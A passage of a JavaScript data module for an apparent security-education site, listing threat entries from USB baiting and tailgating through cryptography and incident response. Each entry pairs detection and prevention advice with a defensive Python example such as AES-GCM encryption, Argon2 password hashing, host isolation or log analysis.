      "Establish policies prohibiting use of unknown USB devices.",
      "Educate users about baiting tactics through security awareness training.",
      "Use endpoint security that scans removable media automatically.",
    ],
    codeExample: `# usb_monitor.py — detect new USB storage devices
import subprocess, time

def get_usb_devices():
    result = subprocess.run(['lsblk', '-o', 'NAME,TRAN,MOUNTPOINT'],
                            capture_output=True, text=True)
    return {line for line in result.stdout.split('\n') if 'usb' in line}

previous = get_usb_devices()
print("USB monitor active. Press Ctrl+C to stop.")
while True:
    time.sleep(2)
    current = get_usb_devices()
    new = current - previous
    if new:
        for device in new:
            print(f"[ALERT] New USB device connected: {device}")
    previous = current`,
    repoPath: "04-social-engineering",
    tags: ["social-engineering", "physical", "usb"],
  },
  {
    slug: "tailgating",
    category: "social-engineering",
    title: "Tailgating",
    subtitle: "Physical Access Bypass",
    severity: "medium",
    description:
      "Tailgating (piggybacking) is a physical security attack where an attacker gains access to a restricted area by following an authorised person through a secured entry point.",
    howItWorks: [
      "Attacker poses as a delivery person, contractor, or employee.",
      "Waits near a secured door while an authorised employee scans their badge.",
      "Follows closely behind as the door opens, relying on social courtesy.",
      "Once inside, can access server rooms, steal hardware, or plant devices.",
    ],
    types: [
      { name: "Passive Tailgating", desc: "Simply following without engaging the target." },
      { name: "Distraction-based", desc: "Engaging the target in conversation to slip in unnoticed." },
      { name: "Authority-based", desc: "Impersonating management or security to be waved through." },
    ],
    detection: [
      "Anti-tailgating door systems (mantrap / airlock) that allow only one person at a time.",
      "Security camera footage review at access points.",
      "Employee reports of unrecognised individuals in restricted areas.",
    ],
    prevention: [
      "Install mantraps or turnstiles at high-security entry points.",
      "Train employees to politely challenge unknown individuals.",
      "Implement visitor badge systems with visible differentiation.",
      "Post clear policies: employees must not hold doors open for others.",
    ],
    codeExample: `# access_log_analyzer.py
from datetime import datetime
from collections import defaultdict

# Detect: multiple entries at same door within 2 seconds (tailgating)
def detect_tailgating(access_logs: list, gap_secs=2) -> list:
    door_entries = defaultdict(list)
    alerts = []

    for log in sorted(access_logs, key=lambda x: x['timestamp']):
        door = log['door_id']
        t    = log['timestamp']
        person = log['person_id']

        recent = [e for e in door_entries[door] if (t - e['t']).seconds <= gap_secs]
        if recent:
            for prev in recent:
                if prev['person'] != person:
                    alerts.append({
                        "door": door, "at": t,
                        "authorised": prev['person'],
                        "possible_tailgater": person
                    })
        door_entries[door].append({'t': t, 'person': person})
    return alerts`,
    repoPath: "04-social-engineering",
    tags: ["social-engineering", "physical", "access-control"],
  },

  // ─── CRYPTOGRAPHY ────────────────────────────────────────────────
  {
    slug: "symmetric-encryption",
    category: "cryptography",
    title: "Symmetric Encryption",
    subtitle: "AES & Shared-Key Cryptography",
    severity: "low",
    description:
      "Symmetric encryption uses a single shared key for both encryption and decryption. AES is the industry-standard symmetric cipher used to protect data at rest and in transit.",
    howItWorks: [
      "Sender and receiver agree on a shared secret key (key exchange is a separate problem).",
      "Sender encrypts plaintext using the key and a cipher algorithm (e.g., AES-256-GCM).",
      "Ciphertext is transmitted or stored.",
      "Receiver decrypts using the same key.",
    ],
    types: [
      { name: "AES-256-GCM", desc: "AEAD mode providing confidentiality and authentication — recommended." },
      { name: "AES-256-CBC", desc: "Cipher Block Chaining — secure when used with proper IV handling." },
      { name: "ChaCha20-Poly1305", desc: "Stream cipher, excellent for mobile/embedded devices." },
      { name: "3DES", desc: "Legacy — deprecated, do not use in new systems." },
    ],
    detection: [
      "Audit code for use of deprecated ciphers (DES, RC4, MD5).",
      "Check that IVs/nonces are never reused with the same key.",
      "Validate key sizes: AES-128 minimum, AES-256 recommended.",
    ],
    prevention: [
      "Use AES-256-GCM (authenticated encryption) for all new implementations.",
      "Store encryption keys separately from encrypted data (HSM or KMS).",
      "Rotate keys on a defined schedule and on suspected compromise.",
      "Never hard-code keys in source code.",
    ],
    codeExample: `# aes_example.py (from the repo)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

def encrypt(plaintext: bytes, key: bytes) -> tuple[bytes, bytes]:
    """Returns (nonce, ciphertext). Key must be 32 bytes for AES-256."""
    nonce      = os.urandom(12)   # 96-bit nonce for GCM
    aesgcm     = AESGCM(key)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return nonce, ciphertext

def decrypt(nonce: bytes, ciphertext: bytes, key: bytes) -> bytes:
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ciphertext, None)

# Usage
key        = os.urandom(32)   # Store this securely!
nonce, enc = encrypt(b"sensitive data", key)
plain      = decrypt(nonce, enc, key)`,
    repoPath: "05-cryptography/encryption/symmetric",
    tags: ["cryptography", "encryption", "aes"],
  },
  {
    slug: "asymmetric-encryption",
    category: "cryptography",
    title: "Asymmetric Encryption",
    subtitle: "RSA, ECC & Public-Key Cryptography",
    severity: "low",
    description:
      "Asymmetric encryption uses a key pair: a public key for encryption and a private key for decryption. It solves the key distribution problem and underpins TLS, SSH, and digital signatures.",
    howItWorks: [
      "Each party generates a key pair (public + private).",
      "Public key is shared freely; private key is kept secret.",
      "Sender encrypts with recipient's public key.",
      "Only the recipient's private key can decrypt the message.",
    ],
    types: [
      { name: "RSA-OAEP", desc: "RSA with Optimal Asymmetric Encryption Padding — use 2048+ bit keys." },
      { name: "ECDH", desc: "Elliptic Curve Diffie-Hellman for key exchange — more efficient than RSA." },
      { name: "Ed25519", desc: "EdDSA on Curve25519 — modern, fast, resistant to side-channel attacks." },
    ],
    detection: [
      "Audit for weak key sizes: RSA < 2048 bits is deprecated.",
      "Check certificate validity and revocation status (OCSP/CRL).",
      "Monitor for use of PKCS#1 v1.5 padding (vulnerable to Bleichenbacher attacks).",
    ],
    prevention: [
      "Use RSA-2048 minimum; prefer RSA-4096 or ECC (P-256, P-384, Curve25519).",
      "Protect private keys with hardware security modules (HSM).",
      "Implement certificate rotation and automated renewal (e.g., Let's Encrypt).",
    ],
    codeExample: `# rsa_example.py (from the repo)
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

# Key generation
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=4096,
)
public_key = private_key.public_key()

# Encrypt with recipient's public key
ciphertext = public_key.encrypt(
    b"secret message",
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None,
    ),
)

# Decrypt with private key
plaintext = private_key.decrypt(
    ciphertext,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None,
    ),
)`,
    repoPath: "05-cryptography/encryption/asymmetric",
    tags: ["cryptography", "rsa", "ecc", "tls"],
  },
  {
    slug: "hashing",
    category: "cryptography",
    title: "Hashing & Password Security",
    subtitle: "One-Way Functions & Secure Storage",
    severity: "medium",
    description:
      "Cryptographic hash functions produce a fixed-size fingerprint from arbitrary data. For passwords, dedicated slow hashing algorithms (Argon2, bcrypt) are critical to resist brute-force attacks.",
    howItWorks: [
      "A hash function maps input data to a fixed-size digest deterministically.",
      "Designed to be one-way: computationally infeasible to reverse.",
      "Even a single character change produces a completely different hash (avalanche effect).",
      "Password hashing adds a random salt to prevent precomputed rainbow table attacks.",
    ],
    types: [
      { name: "SHA-256 / SHA-3", desc: "Integrity verification, digital signatures, certificate fingerprints." },
      { name: "Argon2id", desc: "Recommended password hashing — memory-hard, resistant to GPU cracking." },
      { name: "bcrypt", desc: "Widely deployed password hashing with built-in salting and work factor." },
      { name: "MD5 / SHA-1", desc: "Broken for security purposes — do not use." },
    ],
    detection: [
      "Audit codebase for use of MD5 or SHA-1 for password storage.",
      "Verify salts are unique per password and stored alongside hash.",
      "Check work factor/cost parameter is appropriate for current hardware.",
    ],
    prevention: [
      "Use Argon2id for new systems; bcrypt or scrypt are acceptable alternatives.",
      "Never store plaintext passwords; never use unsalted hashes.",
      "Re-hash passwords with stronger algorithms at next login (migration strategy).",
    ],
    codeExample: `# password_hashing.py (from the repo)
import hashlib, os, argon2
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,
    memory_cost=65536,  # 64 MB
    parallelism=4,
    hash_len=32,
    salt_len=16,
)

# ✅ Recommended: Argon2id
def hash_password(password: str) -> str:
    return ph.hash(password)

def verify_password(stored_hash: str, password: str) -> bool:
    try:
        return ph.verify(stored_hash, password)
    except argon2.exceptions.VerifyMismatchError:
        return False

# ✅ File integrity: SHA-256
def sha256_file(path: str) -> str:
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(65536), b''):
            h.update(chunk)
    return h.hexdigest()`,
    repoPath: "05-cryptography/hashing",
    tags: ["cryptography", "passwords", "integrity"],
  },
  {
    slug: "digital-signatures",
    category: "cryptography",
    title: "Digital Signatures",
    subtitle: "Authentication & Non-repudiation",
    severity: "low",
    description:
      "Digital signatures provide cryptographic proof of the origin and integrity of data, ensuring the sender cannot deny sending a message and the recipient can verify it hasn't been tampered with.",
    howItWorks: [
      "Signer computes a hash of the message.",
      "Hash is encrypted with the signer's private key to produce the signature.",
      "Recipient decrypts the signature with the signer's public key to recover the hash.",
      "If the recovered hash matches the message hash, authenticity and integrity are confirmed.",
    ],
    types: [
      { name: "RSA-PSS", desc: "Probabilistic Signature Scheme — recommended RSA signing variant." },
      { name: "ECDSA", desc: "Elliptic Curve Digital Signature Algorithm — used in TLS, SSH, Bitcoin." },
      { name: "Ed25519", desc: "Fast, secure, deterministic — preferred for new implementations." },
    ],
    detection: [
      "Always verify signatures before trusting signed data.",
      "Audit that signing keys are protected in hardware (HSM, YubiKey).",
    ],
    prevention: [
      "Sign software releases and verify signatures before installation.",
      "Use certificate transparency for TLS certificates.",
      "Implement code signing for all distributed software packages.",
    ],
    codeExample: `# digital_signature.py
from cryptography.hazmat.primitives.asymmetric.ed25519 import (
    Ed25519PrivateKey, Ed25519PublicKey
)

# Generate key pair (store private key securely!)
private_key = Ed25519PrivateKey.generate()
public_key  = private_key.public_key()

# Sign a message
message   = b"This message is authentic."
signature = private_key.sign(message)

# Verify — raises InvalidSignature if tampered
from cryptography.exceptions import InvalidSignature
try:
    public_key.verify(signature, message)
    print("[OK] Signature valid — message is authentic")
except InvalidSignature:
    print("[ALERT] Invalid signature — message may be tampered")`,
    repoPath: "05-cryptography",
    tags: ["cryptography", "authentication", "non-repudiation"],
  },

  // ─── INCIDENT RESPONSE ───────────────────────────────────────────
  {
    slug: "digital-forensics",
    category: "incident-response",
    title: "Digital Forensics",
    subtitle: "Evidence Collection & Analysis",
    severity: "low",
    description:
      "Digital forensics is the process of identifying, collecting, preserving, and analysing digital evidence from systems following a security incident, in a forensically sound manner.",
    howItWorks: [
      "Identify and isolate affected systems before evidence is contaminated.",
      "Capture volatile data (RAM) first, as it is lost on reboot.",
      "Create forensic disk images (bit-for-bit copies) with hash verification.",
      "Analyse artefacts: logs, browser history, file timestamps, registry entries.",
    ],
    types: [
      { name: "Memory Forensics", desc: "Analysis of RAM dumps for running processes, network connections, decrypted data." },
      { name: "Disk Forensics", desc: "Examination of storage media for deleted files, artefacts, timelines." },
      { name: "Network Forensics", desc: "PCAP analysis and log correlation to reconstruct attack timelines." },
      { name: "Mobile Forensics", desc: "Data acquisition from smartphones and tablets." },
    ],
    detection: [
      "Centralise logs to an immutable SIEM before an incident occurs.",
      "Maintain a documented forensic process to ensure admissibility.",
      "Use forensic tools: Autopsy, Volatility, Sleuth Kit.",
    ],
    prevention: [
      "Enable and centralise logging before incidents happen.",
      "Maintain secure, immutable audit logs with chain-of-custody controls.",
      "Train incident response team on forensic procedures.",
    ],
    codeExample: `# memory_analyzer.py (from the repo)
import subprocess, json

def capture_memory_info() -> dict:
    """Capture basic in-memory process and connection info."""
    import psutil
    snapshot = {
        "processes": [],
        "connections": [],
    }
    for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'create_time']):
        try:
            snapshot["processes"].append(proc.info)
        except psutil.NoSuchProcess:
            pass

    for conn in psutil.net_connections(kind='inet'):
        snapshot["connections"].append({
            "laddr": f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
            "raddr": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
            "status": conn.status,
            "pid": conn.pid,
        })
    return snapshot`,
    repoPath: "06-incident-response/forensics",
    tags: ["incident-response", "forensics", "evidence"],
  },
  {
    slug: "containment-strategies",
    category: "incident-response",
    title: "Containment Strategies",
    subtitle: "Limiting Incident Blast Radius",
    severity: "low",
    description:
      "Containment is the phase of incident response focused on preventing the spread of an attack while preserving evidence and maintaining critical business operations.",
    howItWorks: [
      "Incident is confirmed and severity triaged.",
      "Short-term containment: isolate affected systems from the network.",
      "Long-term containment: apply patches, change credentials, harden configs.",
      "Evidence preserved throughout — no systems wiped until forensic copies exist.",
    ],
    types: [
      { name: "Network Isolation", desc: "Quarantine affected hosts via VLAN or firewall rules." },
      { name: "Account Disabling", desc: "Disable compromised user accounts and revoke active sessions." },
      { name: "Traffic Blocking", desc: "Block malicious C2 IPs/domains at the perimeter." },
      { name: "Service Shutdown", desc: "Temporarily disable affected services to stop active exploitation." },
    ],
    detection: [
      "Establish clear escalation criteria so containment begins quickly.",
      "Automated playbooks can trigger containment actions in seconds.",
    ],
    prevention: [
      "Document and rehearse containment playbooks before incidents happen.",
      "Implement network segmentation so isolation is surgical, not broad.",
      "Maintain out-of-band management access for compromised environments.",
    ],
    codeExample: `# isolation_script.py (from the repo)
import subprocess, logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s')

def isolate_host(ip: str, reason: str):
    """Block all traffic to/from IP except management subnet."""
    MGMT_SUBNET = "10.0.0.0/8"
    rules = [
        f"iptables -I FORWARD -s {ip} ! -d {MGMT_SUBNET} -j DROP",
        f"iptables -I FORWARD -d {ip} ! -s {MGMT_SUBNET} -j DROP",
    ]
    for rule in rules:
        result = subprocess.run(rule.split(), capture_output=True)
        if result.returncode == 0:
            logging.info(f"[CONTAINED] {ip} — {reason}")
        else:
            logging.error(f"Failed to isolate {ip}: {result.stderr}")

def revoke_user_sessions(username: str):
    logging.info(f"Revoking all sessions for {username}")
    # Integrate with your IdP/SIEM API here`,
    repoPath: "06-incident-response/containment",
    tags: ["incident-response", "containment", "isolation"],
  },
  {
    slug: "recovery-procedures",
    category: "incident-response",
    title: "Recovery Procedures",
    subtitle: "Restoring Normal Operations",
    severity: "low",
    description:
      "Recovery involves restoring affected systems to normal operation after an incident is contained, ensuring the threat is eradicated and similar incidents are prevented.",
    howItWorks: [
      "Eradication: remove malware, patch vulnerabilities, close attack vectors.",
      "Restore from clean backups or rebuild affected systems from scratch.",
      "Verify integrity of restored systems before reconnecting to production.",
      "Monitor closely for signs of re-infection post-recovery.",
    ],
    types: [
      { name: "Backup Restoration", desc: "Restore from last known-good backup with integrity verification." },
      { name: "System Rebuild", desc: "Wipe and rebuild from trusted images when compromise depth is unknown." },
      { name: "Partial Recovery", desc: "Restore only affected components while keeping clean systems online." },
    ],
    detection: [
      "Verify restored systems against clean baselines before production.",
      "Run full antivirus and EDR scans on all restored systems.",
      "Re-enable monitoring and alerting before reconnecting systems.",
    ],
    prevention: [
      "Maintain and regularly test backups — 3-2-1 rule.",
      "Use immutable backups stored offline or in air-gapped environments.",
      "Document system baselines for rapid rebuild and verification.",
    ],
    codeExample: `# backup_recovery.py (from the repo)
import hashlib, shutil, os, json
from datetime import datetime

def create_backup(source: str, dest: str) -> dict:
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    backup_path = os.path.join(dest, f"backup_{timestamp}")
    shutil.copytree(source, backup_path)

    # Hash every file for integrity verification
    manifest = {}
    for root, _, files in os.walk(backup_path):
        for fname in files:
            fpath = os.path.join(root, fname)
            h = hashlib.sha256()
            with open(fpath, 'rb') as f:
                for chunk in iter(lambda: f.read(65536), b''):
                    h.update(chunk)
            manifest[fpath] = h.hexdigest()

    manifest_path = backup_path + '_manifest.json'
    with open(manifest_path, 'w') as f:
        json.dump(manifest, f, indent=2)

    print(f"Backup created: {backup_path} ({len(manifest)} files)")
    return manifest`,
    repoPath: "06-incident-response/containment",
    tags: ["incident-response", "backup", "recovery"],
  },
  {
    slug: "post-incident-analysis",
    category: "incident-response",
    title: "Post-Incident Analysis",
    subtitle: "Lessons Learned & Hardening",
    severity: "low",
    description:
      "Post-incident analysis (post-mortem) documents what happened, how it was detected and resolved, and identifies improvements to prevent recurrence and strengthen defences.",
    howItWorks: [
      "Incident timeline reconstructed from logs, alerts, and analyst notes.",
      "Root cause identified: how did the attacker gain initial access?",
      "Detection gaps identified: what could have caught this sooner?",
      "Remediation and hardening actions documented and assigned.",
    ],
    types: [
      { name: "Root Cause Analysis", desc: "Identifying the fundamental weakness that enabled the incident." },
      { name: "Timeline Reconstruction", desc: "Chronological log of attacker actions from initial access to detection." },
      { name: "Lessons Learned", desc: "Documentation of improvements to process, tools, and training." },
    ],
    detection: [
      "Centralised logging and SIEM are prerequisites for effective post-incident analysis.",
      "Maintain a ticketing/case system to track all incident actions.",
    ],
    prevention: [
      "Conduct blameless post-mortems to encourage full transparency.",
      "Track remediation items as formal engineering tasks.",
      "Share sanitised findings with the wider team to improve collective knowledge.",
    ],
    codeExample: `# log_analyzer.py (from the repo)
import re
from datetime import datetime
from collections import Counter

# Parse Apache/Nginx access logs to reconstruct incident timeline
LOG_PATTERN = re.compile(
    r'(?P<ip>\\S+) .+ \\[(?P<time>[^\\]]+)\\] '
    r'"(?P<method>\\S+) (?P<path>\\S+) \\S+" '
    r'(?P<status>\\d+) (?P<size>\\d+)'
)

def analyze_logs(logfile: str, attacker_ip: str) -> dict:
    timeline = []
    with open(logfile) as f:
        for line in f:
            m = LOG_PATTERN.match(line)
            if m and m.group('ip') == attacker_ip:
                timeline.append({
                    "time":   m.group('time'),
                    "method": m.group('method'),
                    "path":   m.group('path'),
                    "status": int(m.group('status')),
                })
    paths   = Counter(e['path'] for e in timeline)
    return {
        "total_requests": len(timeline),
        "timeline": timeline[:20],
        "top_paths": paths.most_common(5),
    }`,
    repoPath: "06-incident-response",
    tags: ["incident-response", "analysis", "post-mortem"],
  },
];

export const getCategoryBySlug = (slug) =>
  categories.find((c) => c.slug === slug) || null;

export const getThreatsByCategory = (categorySlug) =>
  threats.filter((t) => t.category === categorySlug);

export const getThreatBySlug = (slug) =>
  threats.find((t) => t.slug === slug) || null;

export const searchThreats = (query) => {
  const q = query.toLowerCase();
  return threats.filter(
    (t) =>
      t.title.toLowerCase().includes(q) ||
      t.subtitle.toLowerCase().includes(q) ||
      t.description.toLowerCase().includes(q) ||
      t.tags.some((tag) => tag.includes(q))
  );
};

export const severityOrder = { critical: 0, high: 1, medium: 2, low: 3 };
